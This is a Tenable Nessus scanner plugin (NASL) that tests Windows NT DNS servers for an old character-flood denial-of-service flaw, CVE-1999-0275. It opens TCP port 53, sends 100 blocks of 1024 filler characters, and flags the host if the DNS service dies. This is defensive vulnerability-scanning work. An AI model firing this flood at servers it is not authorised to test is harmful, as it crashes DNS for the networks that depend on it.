#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(10312);
  script_version ("$Revision: 1.24 $");
  script_cve_id("CVE-1999-0275");
  script_osvdb_id(11471);

  script_name(english:"WindowsNT DNS Server Character Saturation DoS");
  script_summary(english:"Crashes the remote DNS server");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote DNS server is vulnerable to denial of service.'
  );

  script_set_attribute(
    attribute:'description',
    value:"We could make the remote DNS server crash by flooding it
with characters. It is likely a WindowsNT DNS server.

Crashing the DNS server could allow an attacker to make your network
non-functional, or even to use some DNS spoofing techniques to gain
privileges on the network."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Install Service Pack 3 (SP3) for Windows NT."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_set_attribute(
    attribute:'see_also',
    value:'http://support.microsoft.com/default.aspx?scid=kb;EN-US;169461'
  );


 script_set_attribute(attribute:"plugin_publication_date", value: "1999/06/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "1997/06/01");
 script_cvs_date("$Date: 2016/11/29 20:13:38 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:microsoft:windows_nt");
  script_end_attributes();

  script_category(ACT_DENIAL);	# ACT_FLOOD?
  script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");
  script_family(english: "DNS");
  script_require_ports(53);
  exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");

if (! get_port_state(53)) exit(0, "TCP port 53 is closed.");

soc = open_sock_tcp(53);
if (! soc) exit(1);

  c = crap(1024);
  for(i=0;i<100;i=i+1)send(socket:soc, data:c);
  close(soc);

if (service_is_dead(port: 53) > 0)
  security_warning(53);



